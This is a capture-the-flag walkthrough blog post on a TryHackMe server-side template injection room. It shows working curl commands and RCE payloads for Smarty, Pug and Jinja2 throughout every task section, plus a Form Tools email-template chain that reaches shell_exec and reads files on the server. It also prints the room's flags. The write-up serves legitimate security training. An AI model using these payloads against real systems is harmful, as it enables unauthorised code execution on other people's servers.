---
title: "TryHackMe Server-side Template Injection: SSTI to RCE"
date: 2026-10-17T21:31:00+05:30
lastmod: 2026-10-17T21:31:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-ssti/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Injection Attacks
  - SSTI
  - Server-Side Template Injection
  - Smarty
  - Jinja2
  - Pug
  - RCE
  - Form Tools

draft: false
description: "Walkthrough of TryHackMe Server-side Template Injection: confirming SSTI in Smarty, Pug, and Jinja2, then escaping each to RCE plus a Form Tools Smarty chain."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Server-side Template Injection |![Server-side Template Injection room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1716690622951)|

Server-side Template Injection sits in the Injection Attacks module of the Web Application Pentesting path, a few rooms along from the SQL and NoSQL work. Where [Injectics](/post/thm-room-injectics/) buried one Twig SSTI at the end of a long chain, this room is the opposite: it lines up four separate apps, one per template engine, so you drill the same idea (confirm the engine, then turn rendering into code execution) against Smarty, Pug, and Jinja2 in turn, with a Form Tools challenge at the end. If you have done [ORM Injection](/post/thm-room-orminjection/) or [NoSQL Injection](/post/thm-room-nosqlinjectiontutorial/), the root cause is familiar: untrusted input reaching an interpreter, only here the interpreter is the template engine.

The target exposes several small apps on one host under the vhost `ssti.thm`: a PHP/Smarty app on port 8000, a NodeJS/Pug app on 8001, a Python/Jinja2 app on 8002, and a Form Tools admin panel on 8080. Everything was reachable directly over the TryHackMe VPN for my session, so each command below is a plain `curl` from my own machine. The lab IP was `10.49.149.122`; substitute your own, or add `ssti.thm` to your hosts file. The three teaching apps all take the payload in a `page` parameter and reflect the rendered result.

## Task 4: Smarty (PHP), confirm then system()

The Smarty app at `/smarty/` posts a `page` field. The standard confirm payload is a modifier call, `{'Hello'|upper}`, which returns `HELLO` when Smarty is doing the rendering:

```bash
  # confirm Smarty: uppercase modifier is evaluated
curl -s -H "Host: ssti.thm" "http://$T:8000/smarty/" --data-urlencode "page={'Hello'|upper}"
  # ...<p>HELLO</p>...
```

Smarty will happily call PHP functions when no security policy is set, so `{system('...')}` is direct code execution. Listing the app directory shows the engine runs as a privileged user and that a lone MD5-named text file sits next to `index.php`:

```bash
curl -s -H "Host: ssti.thm" "http://$T:8000/smarty/" --data-urlencode "page={system('ls -la')}"
  # -rw-rw-r-- 1 root root   38 May 19  2024 7c45b2d3a741398826f497d58b73a401.txt
  # -rw-rw-r-- 1 root root 2288 Jun 11  2024 index.php
  # drwxr-xr-x 3 root root 4096 May 18  2024 smarty-3.1.30
```

Reading that file answers the question. The content of the hidden text file in the server directory is **THM{0739eea78f5c7f4b1690737c6258e38b}**.

```bash
curl -s -H "Host: ssti.thm" "http://$T:8000/smarty/" \
  --data-urlencode "page={system('cat 7c45b2d3a741398826f497d58b73a401.txt')}"
```

## Task 5: Pug (NodeJS), spawnSync for RCE

The Pug app lives at `http://ssti.thm:8001/jade`. Pug uses `#{...}` interpolation, so `#{7*7}` rendering to `49` confirms it. Because the interpolation is raw JavaScript, you reach Node's `child_process` straight off the global `process` object. The one trap the task calls out: `spawnSync` takes the command and its arguments as separate items, so flags go in the array, not glued to the command string.

```bash
  # confirm: #{7*7} -> 49, then list the dir with spawnSync
curl -s -H "Host: ssti.thm" "http://$T:8001/jade" \
  --data-urlencode "page=#{root.process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout}"
  # -rw-rw-r-- 1 root root   38 May 19  2024 7f58571b42d8c477a2f3efa69a681ac3.txt
  # -rw-r--r-- 1 root root 2030 May 18  2024 app.js
```

`root.process.mainModule.require` pulls in `child_process` even when a direct `require` is out of scope, `spawnSync('cat',['<file>'])` runs the read, and `.stdout` lands the output in the page. The content of the hidden text file is **THM{1f8c3b32ad3217e84c145398bae00876}**.

{{< ad >}}

## Task 6: Jinja2 (Python), the object chain and a cleaner payload

The Jinja2 app at `http://ssti.thm:8002/jinja2/` (the trailing slash matters, it 302-redirects without it) confirms with `{{7*7}}` rendering to `49`. The room teaches the classic object-walk payload, climbing from a string literal through `__class__.__mro__[1].__subclasses__()` to a `subprocess` class by index:

```text
{{ "".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls") }}
```

That `[157]` is the catch: the subclass index is environment-specific and shifts between Python builds, so hardcoding it is brittle. In a real Flask-backed Jinja2 context the reliable route is a built-in global that already holds a module reference. `lipsum` is such a global, and `lipsum.__globals__.os` is `os`, so one short line gives command execution without counting subclasses:

```bash
curl -s -H "Host: ssti.thm" "http://$T:8002/jinja2/" \
  --data-urlencode "page={{ lipsum.__globals__.os.popen('ls -la').read() }}"
  # -rw-rw-r-- 1 root root   38 May 19  2024 5d8bea6df83cbb6767a235c4ba54933b.txt
  # -rw-rw-r-- 1 root root 1998 Jun 11  2024 jinja2Template.py
```

Swapping `ls` for `cat 5d8bea6df83cbb6767a235c4ba54933b.txt` reads the flag. The content of the hidden text file is **THM{ecc43642dd6934d37c69598174e6e126}**.

## Task 8: Extra-Mile, Form Tools Smarty SSTI to RCE

The challenge app on port 8080 is a real CMS, Form Tools, with the credentials `admin` / `admin`. The asset versions (`?v=3_0_3`) and the `formtools.org` footer give it away, and Form Tools renders email templates through Smarty. The injection is second-order and needs a little setup, but every step runs over `curl` once you are logged in.

First, log in and create an internal form. Form Tools then lets you attach an email template to that form, and the template body is stored and parsed by Smarty:

```bash
  # after login (admin/admin), create an internal form, then an email template on it
curl -s -b c.txt "http://ssti.thm:8080/admin/forms/add/internal.php" \
  --data-urlencode "form_name=pwn" --data-urlencode "num_fields=3" \
  --data-urlencode "access_type=admin" --data-urlencode "add_form=1"
  # -> 302 ../edit/?form_id=2&message=notify_internal_form_created
```

The readable channel is the template preview. Form Tools exposes `actions.php?action=display_test_email`, which parses the saved template with Smarty and returns the rendered content as JSON straight back to the browser, no mail server needed. Save a Smarty probe into the template's `html_template` field, then call the preview:

```bash
  # html_template = {$smarty.version}
curl -s -b c.txt \
  "http://ssti.thm:8080/global/code/actions.php?action=display_test_email&test_email_format=html&test_email_recipient=a@a.com&test_email_data_source=submission_id&test_email_submission_id=1"
  # [true,{"html_content":"3.1.31 ...
```

`3.1.31` is the Smarty version, so the field is injectable and the output comes back to me. Smarty modifiers map to PHP functions when no security policy is enforced, so `{'<cmd>'|shell_exec}` is clean RCE. The app runs as `www-data`, and the hidden file sits in the web root:

```bash
  # html_template = {'id'|shell_exec}   ->  uid=33(www-data) gid=33(www-data) ...
  # html_template = {'find / -maxdepth 4 -name "*.txt" 2>/dev/null'|shell_exec}
  # -> /var/www/html/105e15924c1e41bf53ea64afa0fa72b2.txt
  # html_template = {'cat /var/www/html/105e15924c1e41bf53ea64afa0fa72b2.txt'|shell_exec}
```

The content of the hidden text file in the directory is **THM{w0rK1Ng_sST1}**. Worth noting: Form Tools ships a `SecureSmarty.class.php` sandbox, but the email-template path does not run through it, which is exactly why the modifier reaches `shell_exec`.

## Takeaways

Two ideas carry past this lab into real web targets.

- **The confirm step is the same everywhere, the escape is per engine.** A math or string probe (`{{7*7}}`, `#{7*7}`, `{'x'|upper}`) only tells you an engine is rendering; turning that into RCE means knowing that engine's reachable internals. Smarty maps modifiers to PHP functions, Pug interpolates raw JavaScript into `child_process`, and Jinja2 walks the Python object graph. On a live target, fuzz every template-backed field with the right probe for the stack, then reach for the engine-specific payload rather than a generic one.
- **Prefer a stable global over a brittle index.** The textbook Jinja2 payload counts to subclass `[157]`, which breaks the moment the Python build changes. Anchoring on a module-carrying global like `lipsum.__globals__.os` (or `cycler`, `joiner`) survives that drift, and the same instinct applies to any object-walk exploit: find the shortest path through something that is always present. The Form Tools stage is the broader lesson, a sandbox like `SecureSmarty` is only as good as its coverage, and the unaudited render path (here, email templates) is where the escape lives.

Room solved 100%: 10 tasks, 4 flags.
